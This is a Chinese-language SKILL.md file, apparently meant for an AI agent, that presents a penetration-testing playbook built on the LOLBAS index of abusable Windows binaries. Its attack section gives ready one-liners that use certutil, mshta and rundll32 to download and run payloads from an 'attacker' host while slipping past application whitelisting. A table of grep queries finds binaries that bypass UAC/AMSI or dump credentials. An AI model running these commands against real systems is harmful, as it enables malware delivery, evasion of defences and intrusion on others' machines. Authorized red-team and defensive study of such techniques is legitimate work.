---
name: lolbas-living-off-land
description: 渗透工具 skill:LOLBAS 项目 的安装、参数速查与攻击场景 playbook。当任务涉及 无文件与LOLBins滥用 需要调用 LOLBAS 项目 时使用。
when-to-use: 渗透工具 skill:LOLBAS 项目 的安装、参数速查与攻击场景 playbook。当任务涉及 无文件与LOLBins滥用 需要调用 LOLBAS 项目 时使用。
---

# LOLBAS 项目

- 攻击大类:C23 无文件与LOLBins滥用
- 上游仓库:https://github.com/LOLBAS-Project/LOLBAS
- 上游 License:MIT(内容库)(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/LOLBAS-Project/LOLBAS 或在线查询 lolbas-project.github.io
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `git grep -i 'download' -- '*.md'` | 查可下载文件的二进制 |
| `git grep -i 'execution'` | 查可执行命令的二进制 |
| `git grep -i 'encode'` | 查可编码的(binary → base64) |
| `git grep -i 'bypass'` | 查可绕 UAC/AMSI 的 |
| `git grep -i 'credentials'` | 查可导出凭据的 |

## 攻击场景 Playbook

### 白名单二进制执行绕过

```bash
# 用 certutil 下载+执行(常被白名单放行):
certutil.exe -urlcache -split -f http://attacker/x.exe C:\Windows\Temp\x.exe && C:\Windows\Temp\x.exe
# 用 mshta 执行远程脚本:
mshta.exe http://attacker/evil.hta
```

### rundll32 无文件执行

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker/x.sct")
```

## 注意事项

Windows 自带 200+ 可滥用二进制的权威索引;每个条目含审计命令与绕过用法,Agent 按场景检索。
